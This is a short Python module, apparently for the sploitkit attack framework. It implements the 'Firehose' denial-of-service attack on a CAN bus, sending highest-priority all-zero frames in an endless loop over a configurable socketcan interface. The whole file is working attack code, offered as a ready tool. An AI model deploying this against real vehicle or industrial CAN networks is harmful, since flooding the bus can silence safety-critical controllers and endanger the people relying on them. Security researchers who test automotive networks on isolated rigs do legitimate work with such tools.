from sploitkit import *
from pyvit import can
from pyvit.hw import socketcan

class kill_bus(Module):
    """ This module will perform a known denial of service via the CAN bus called Firehose attack.   

    Author:  shipcod3
    Credits: Eric Evenchick (pyvit module and example)
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })    
    def run(self):
        dev = socketcan.SocketCanDev(self.config.option('INTERFACE').value)

        dev.start()
        print("[*] Performing Firehose Attack [DoS]")
        frame = can.Frame(0)
        frame.data = [0] * 8
        print("Press Ctrl+C to stop or cancel")

        while True:
            dev.send(frame)
        pass
